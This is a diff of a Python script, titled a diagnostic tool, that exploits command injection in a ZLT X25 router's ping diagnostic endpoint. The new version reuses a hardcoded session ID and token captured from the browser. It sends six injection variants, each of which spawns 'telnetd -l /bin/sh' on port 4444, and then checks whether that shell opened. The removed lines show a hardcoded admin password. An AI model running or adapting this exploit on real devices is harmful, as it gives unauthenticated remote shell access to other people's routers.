@@ -1,41 +1,33 @@
 #!/usr/bin/env python3
 """
-ZLT X25 Injection Diagnostic Tool
-Runs directly — no venv needed beyond stdlib.
+ZLT X25 Injection Diagnostic — Phase 2
+Uses the REAL sessionId and token captured from your browser.
+No login needed — just tests injection payload formats directly.
 
 Usage:
     python3 diag.py
-
-Prints every request and response so we can see exactly
-what the router accepts and rejects.
 """
 
 import json
 import re
 import sys
 import urllib.error
-import urllib.parse
 import urllib.request
 
-ROUTER_IP  = "192.168.1.1"
-USERNAME   = "admin"
-PASSWORD   = "Wachina@2025"
-PROTO      = "http"
+ROUTER_IP = "192.168.1.1"
+PROTO     = "http"
 
-import hashlib, os, time
+# ── These come from YOUR browser Dev Tools capture ────────────────────────────
+# sessionId: from any http.cgi request → Payload tab → sessionId field
+# token:     from the cmd:168 START request → Payload tab → token field
+REAL_SID   = "437435bcafc9ed3f6c6a7b33d92491dec9ccc9a81ebeae6c2fd561a3269d54a2"
+REAL_TOKEN = "8ee7e67a7e93951aae181da52f12d189"
+# ─────────────────────────────────────────────────────────────────────────────
 
-def gen_session_id() -> str:
-    """
-    Mirrors what the X25 web UI JavaScript does:
-    generates a random 64-char hex string client-side
-    and sends it with every request from the very first one.
-    """
-    raw = f"{time.time()}{os.urandom(32).hex()}"
-    return hashlib.sha256(raw.encode()).hexdigest()
+url = f"{PROTO}://{ROUTER_IP}/cgi-bin/http.cgi"
 
-# ── helpers ───────────────────────────────────────────────────────────────────
 
-def post_json(url, payload, session_id=""):
+def post_json(payload, session_id=""):
     headers = {
         "Content-Type":     "application/json",
         "X-Requested-With": "XMLHttpRequest",
@@ -52,220 +44,130 @@ def post_json(url, payload, session_id=""):
         req = urllib.request.Request(url, data=data, headers=headers, method="POST")
         with urllib.request.urlopen(req, timeout=8) as resp:
             body = resp.read().decode("utf-8", errors="ignore")
-            print(f"    status  : {resp.status}")
-            print(f"    headers : {dict(resp.headers)}")
-            print(f"    body    : {body[:600]}")
-            return resp.status, dict(resp.headers), body
+            print(f"    status  : HTTP {resp.status}")
+            print(f"    body    : {body[:400]}")
+            return resp.status, body
     except urllib.error.HTTPError as e:
         body = e.read().decode("utf-8", errors="ignore")
-        print(f"    HTTP ERROR {e.code}: {body[:400]}")
-        return e.code, dict(e.headers), body
+        # Strip HTML for cleaner output
+        body_clean = re.sub(r"<[^>]+>", "", body).strip()
+        print(f"    status  : HTTP {e.code} ERROR")
+        print(f"    body    : {body_clean[:200]}")
+        return e.code, body
     except Exception as exc:
         print(f"    EXCEPTION: {exc}")
-        return 0, {}, str(exc)
+        return 0, str(exc)
 
-# ── Step 0: generate client-side sessionId (same as browser JS does) ─────────
 
+# ── STEP 1: Verify session is still alive ─────────────────────────────────────
 print("=" * 60)
-print("STEP 0 — GENERATE CLIENT-SIDE SESSION ID")
+print("STEP 1 — VERIFY SESSION IS ALIVE (cmd:113)")
 print("=" * 60)
+print(f"Using sessionId: {REAL_SID[:20]}…")
+print(f"Using token:     {REAL_TOKEN}")
 
-url = f"{PROTO}://{ROUTER_IP}/cgi-bin/http.cgi"
+s, b = post_json({
+    "cmd": 113, "method": "GET",
+    "language": "en", "sessionId": REAL_SID,
+}, session_id=REAL_SID)
 
-# The X25 web UI generates a random 64-char hex sessionId in JavaScript
-# and includes it in EVERY request body from the very first one —
-# including the login request itself. The server never issues it;
-# the client generates it and the server stores it after login.
-guest_sid = gen_session_id()
-print(f"\n>>> Generated sessionId: {guest_sid}")
-print("    (This mirrors what the browser JS generates on page load)\n")
-
-# ── Step 1: login ─────────────────────────────────────────────────────────────
-
-print("\n" + "=" * 60)
-print("STEP 1 — LOGIN (with guest sessionId in payload)")
-print("=" * 60)
-
-# Build login payload — include guest_sid if we have one
-login_payload = {
-    "cmd": 1, "method": "POST", "subcmd": 1,
-    "language": "EN", "username": USERNAME, "password": PASSWORD,
-}
-if guest_sid:
-    login_payload["sessionId"] = guest_sid
-
-status, hdrs, body = post_json(url, login_payload, session_id=guest_sid)
-
-# Extract sessionId — check response body JSON first (X25 puts it there)
-sid = ""
-try:
-    j = json.loads(body)
-    print(f"\n>>> Login JSON keys: {list(j.keys())}")
-    print(f">>> Login JSON full: {json.dumps(j, indent=2)[:600]}")
-    # X25 returns sessionId directly in the body after successful login
-    for k in ("sessionId", "session_id", "sid", "token", "data"):
-        v = j.get(k)
-        if isinstance(v, str) and len(v) >= 4:
-            sid = v
-            print(f">>> sessionId from JSON[{k!r}]: {sid!r}")
-            break
-        # sometimes nested under "data" dict
-        if isinstance(v, dict):
-            for k2, v2 in v.items():
-                if "session" in k2.lower() or "sid" in k2.lower():
-                    if isinstance(v2, str) and len(v2) >= 4:
-                        sid = v2
-                        print(f">>> sessionId nested JSON[{k!r}][{k2!r}]: {sid!r}")
-                        break
-except Exception as exc:
-    print(f">>> JSON parse error: {exc}")
-
-# Check Set-Cookie header
-if not sid:
-    for hdr in ("Set-Cookie", "set-cookie"):
-        v = hdrs.get(hdr, "")
-        m = re.search(r"sessionId=([A-Za-z0-9_\-]{4,})", v)
-        if m:
-            sid = m.group(1)
-            print(f">>> sessionId from Set-Cookie: {sid!r}")
-            break
-
-# Raw body scan
-if not sid:
-    m = re.search(r'sessionId["\s:=]+([A-Za-z0-9_\-]{8,})', body)
-    if m:
-        sid = m.group(1)
-        print(f">>> sessionId from raw body scan: {sid!r}")
-
-# Fall back to guest_sid if login didn't issue a new one
-if not sid and guest_sid:
-    sid = guest_sid
-    print(f">>> No new sessionId in response — using our generated sid: {sid[:16]}…")
-
-print(f"\n>>> Final sessionId: {sid[:16]}…")
-
-if not sid:
-    print("\n[!] Could not extract sessionId — cannot continue.")
+if s == 200 and '"success":true' in b:
+    print("\n✔ Session is ALIVE — proceeding to injection tests")
+else:
+    print("\n✘ Session is DEAD or rejected.")
+    print("  You need a fresh sessionId. Do this:")
+    print("  1. Open http://192.168.1.1 in Chrome and log in")
+    print("  2. Open Dev Tools → Network tab")
+    print("  3. Click any http.cgi request → Payload tab")
+    print("  4. Copy the sessionId value")
+    print("  5. Update REAL_SID at the top of this file")
+    print("  6. Run diag.py again")
     sys.exit(1)
 
-# ── Step 2: fetch CSRF token via cmd:113 GET ──────────────────────────────────
-
+# ── STEP 2: Test clean ping first (no injection) ──────────────────────────────
 print("\n" + "=" * 60)
-print("STEP 2 — FETCH CSRF TOKEN (cmd:113 GET)")
+print("STEP 2 — CLEAN PING (exact browser format, no injection)")
 print("=" * 60)
 
-status2, hdrs2, body2 = post_json(url, {
-    "cmd": 113, "method": "GET",
-    "language": "en", "sessionId": sid,
-}, session_id=sid)
+s, b = post_json({
+    "cmd": 168, "method": "POST", "subcmd": 0,
+    "pingTimes": 1,
+    "url": "127.0.0.1",
+    "token": REAL_TOKEN,
+    "language": "en",
+    "sessionId": REAL_SID,
+}, session_id=REAL_SID)
 
-token = ""
-try:
-    j2 = json.loads(body2)
-    print(f"\n>>> Parsed JSON keys: {list(j2.keys())}")
-    print(f">>> Full JSON: {json.dumps(j2, indent=2)[:800]}")
-    for k in ("token", "Token", "TOKEN", "csrf", "nonce"):
-        if isinstance(j2.get(k), str):
-            token = j2[k]
-            print(f">>> Token found at key '{k}': {token!r}")
-            break
-    if not token:
-        # Try nested
-        for v in j2.values():
-            if isinstance(v, dict):
-                for k2, v2 in v.items():
-                    if "token" in k2.lower() and isinstance(v2, str):
-                        token = v2
-                        print(f">>> Token found nested at '{k2}': {token!r}")
-                        break
-except Exception as exc:
-    print(f">>> JSON parse failed: {exc}")
+if s == 200:
+    print("\n✔ Clean ping ACCEPTED — format is correct")
+    CLEAN_WORKS = True
+else:
+    print("\n✘ Even a clean ping is rejected — token is stale or format wrong")
+    print("  Get a fresh token:")
+    print("  1. On the Diagnosis page, open Dev Tools → Network")
+    print("  2. Click Start (with 127.0.0.1)")
+    print("  3. Click the FIRST http.cgi request at the top of the list")
+    print("  4. Payload tab → copy the 'token' value")
+    print("  5. Update REAL_TOKEN at the top of this file and rerun")
+    CLEAN_WORKS = False
 
-# Also try raw regex scan
-if not token:
-    m = re.search(r'"token"\s*:\s*"([0-9a-fA-F]{8,})"', body2, re.IGNORECASE)
-    if m:
-        token = m.group(1)
-        print(f">>> Token from regex: {token!r}")
-
-print(f"\n>>> Final token: {token!r}")
-
-# ── Step 3: try injection payloads ───────────────────────────────────────────
-
+# ── STEP 3: Test injection payloads ──────────────────────────────────────────
 print("\n" + "=" * 60)
-print("STEP 3 — INJECTION ATTEMPTS")
+print("STEP 3 — INJECTION PAYLOADS")
 print("=" * 60)
 
-inject_cmd = "127.0.0.1 ; telnetd -l /bin/sh -p 4444"
+if not CLEAN_WORKS:
+    print("Skipping — fix the token first (see above)")
+    sys.exit(1)
 
-payloads = [
-    # With token, lowercase language
-    {
-        "cmd": 168, "method": "POST", "subcmd": 0,
-        "pingTimes": 1,
-        "url": inject_cmd,
-        "token": token,
-        "language": "en",
-        "sessionId": sid,
-    },
-    # With token, uppercase language
-    {
-        "cmd": 168, "method": "POST", "subcmd": 0,
-        "pingTimes": 1,
-        "url": inject_cmd,
-        "token": token,
-        "language": "EN",
-        "sessionId": sid,
-    },
-    # Without token
-    {
-        "cmd": 168, "method": "POST", "subcmd": 0,
-        "pingTimes": 1,
-        "url": inject_cmd,
-        "language": "en",
-        "sessionId": sid,
-    },
-    # With "ip" field instead of "url"
-    {
-        "cmd": 168, "method": "POST", "subcmd": 0,
-        "pingTimes": 1,
-        "ip": inject_cmd,
-        "token": token,
-        "language": "en",
-        "sessionId": sid,
-    },
-    # cmd 168 subcmd 1
-    {
-        "cmd": 168, "method": "POST", "subcmd": 1,
-        "pingTimes": 1,
-        "url": inject_cmd,
-        "token": token,
-        "language": "en",
-        "sessionId": sid,
-    },
-    # cmd 172 (old) with "url" field
-    {
-        "cmd": 172, "method": "POST", "subcmd": 0,
-        "pingTimes": 1,
-        "url": inject_cmd,
-        "token": token,
-        "language": "en",
-        "sessionId": sid,
-    },
+candidates = [
+    # A: semicolon injection (classic)
+    "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
+    # B: pipe injection
+    "127.0.0.1 | telnetd -l /bin/sh -p 4444",
+    # C: newline injection
+    "127.0.0.1\ntelnetd -l /bin/sh -p 4444",
+    # D: backtick injection
+    "127.0.0.1 `telnetd -l /bin/sh -p 4444`",
+    # E: dollar-paren injection
+    "127.0.0.1 $(telnetd -l /bin/sh -p 4444)",
+    # F: double ampersand
+    "127.0.0.1 && telnetd -l /bin/sh -p 4444",
 ]
 
-for i, p in enumerate(payloads, 1):
-    print(f"\n--- Payload {i}/{len(payloads)} ---")
-    s, h, b = post_json(url, p, session_id=sid)
+for i, cmd_str in enumerate(candidates, 1):
+    print(f"\n--- Injection variant {i}: {cmd_str!r} ---")
+    s, b = post_json({
+        "cmd": 168, "method": "POST", "subcmd": 0,
+        "pingTimes": 1,
+        "url": cmd_str,
+        "token": REAL_TOKEN,
+        "language": "en",
+        "sessionId": REAL_SID,
+    }, session_id=REAL_SID)
+
     if s == 200:
-        print(f"    >>> HTTP 200 — this payload was ACCEPTED")
+        print(f"    ✔ ACCEPTED (HTTP 200)")
+        print(f"    body: {b[:300]}")
+        print(f"\n>>> NOW CHECK: does port 4444 respond?")
+        import socket
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            result = sock.connect_ex((ROUTER_IP, 4444))
+            sock.close()
+            if result == 0:
+                print(f"    ✔✔ PORT 4444 IS OPEN — INJECTION WORKED!")
+            else:
+                print(f"    Port 4444 closed — injection accepted but telnetd may not have started")
+        except Exception as e:
+            print(f"    Port check error: {e}")
     elif s == 400:
-        print(f"    >>> HTTP 400 — REJECTED")
-    elif s == 403:
-        print(f"    >>> HTTP 403 — FORBIDDEN (session issue?)")
+        b_clean = re.sub(r"<[^>]+>", "", b).strip()
+        print(f"    ✘ HTTP 400 — {b_clean[:100]}")
     else:
-        print(f"    >>> HTTP {s}")
+        print(f"    ? HTTP {s}")
 
 print("\n" + "=" * 60)
-print("DONE — paste this full output for analysis")
+print("DONE")
 print("=" * 60)
